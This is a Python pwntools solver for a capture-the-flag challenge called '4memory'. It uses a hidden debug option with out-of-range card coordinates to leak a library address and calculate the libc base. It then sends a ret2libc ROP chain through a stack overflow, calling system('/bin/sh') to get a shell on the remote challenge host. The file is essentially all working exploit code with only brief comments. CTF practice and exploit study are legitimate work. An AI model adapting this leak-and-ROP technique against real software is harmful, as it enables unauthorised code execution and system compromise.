# ret2libcs502libm2libc solver
# Written By Tyler Zars

# Run with `python3 solve.py BIN=./4memory REMOTE`

from pwn import *
context.log_level = 'debug'

# Setup for Run
binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]

# Break after gets()
gs = '''
break *0x4013f0
break *0x4013f8
continue
'''

# Load In Binary & ROPGadget it
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("spaceheroes-space-memory.chals.io", 443, ssl=True, sni="spaceheroes-space-memory.chals.io")
    else:
        return process(e.path)

# Stuff
p = start()

# Get into secret debugger and leak libcs50 address
p.sendlineafter(b'Choice:', b'Y')
p.sendlineafter(b'Pick first card (row, column): ', b'1337,31337')
p.sendlineafter(b'Pick second card (row, column): ', b'31337,1337')
p.recvuntil(b'nice treat: ')
long_long_addr = p.recvline().strip(b"\n")
print(long_long_addr)
long_long_libcs50_leak = int(long_long_addr, 0)


# Calculate libC base address
libcs50 = long_long_libcs50_leak - 0x1D41
libc = e.libc
libc.address = libcs50 - 0xDF000 - 0x1E1000 # CS50 size - libm size

print(hex(libc.address))
r_libc = ROP(libc)

# Simple ret2libc chain
chain = cyclic(48)
chain += p64(r_libc.find_gadget(['ret'])[0]) # Realign stack to 16 offsets
chain += p64(r_libc.find_gadget(['pop rdi', 'ret'])[0]) # Prepare for payload into read function
chain += p64(next(libc.search(b'/bin/sh'))) # Add in our data
chain += p64(r_libc.find_gadget(['ret'])[0]) # Realign stack to 16 offsets
chain += p64(libc.sym['system']) # Run as system call
p.sendlineafter(b'>>>', chain)
p.interactive()
